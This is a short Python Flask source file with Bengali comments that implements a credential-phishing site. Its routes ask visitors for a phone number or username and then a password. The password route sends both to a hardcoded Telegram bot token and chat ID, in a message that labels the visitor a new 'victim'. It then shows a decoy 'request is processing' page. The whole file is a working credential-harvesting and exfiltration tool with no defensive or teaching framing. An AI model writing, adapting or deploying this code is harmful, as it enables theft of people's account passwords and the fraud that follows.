import os
import requests
from flask import Flask, render_template, request, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

# টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি বসানো হয়েছে
TELEGRAM_BOT_TOKEN = '8680709433:AAE2M6j2cyJ65UkoPr0_ObXsmV6xO8TU72w'
CHAT_ID = '7162958713'

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/phone', methods=['GET', 'POST'])
def phone_page():
    if request.method == 'POST':
        phone = request.form.get('phone')
        session['phone'] = phone
        return redirect(url_for('password_page'))
    return render_template('phone.html')

@app.route('/password', methods=['GET', 'POST'])
def password_page():
    if request.method == 'POST':
        password = request.form.get('password')
        phone = session.get('phone', 'Unknown')
        
        # টেলিগ্রামে মেসেজ পাঠানোর কোড
        message = f"⚠️ নতুন শিকারের তথ্য!\n👤 ইউজার/লিংক: {phone}\n🔑 পাসওয়ার্ড: {password}"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {'chat_id': CHAT_ID, 'text': message}
        
        try:
            requests.post(url, json=payload)
        except Exception as e:
            print('Telegram Error:', e)
            
        return redirect(url_for('warning_page'))
    return render_template('password.html')

@app.route('/warning')
def warning_page():
    return "<h3>ধন্যবাদ! আপনার অনুরোধটি প্রসেস হচ্ছে।</h3>"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
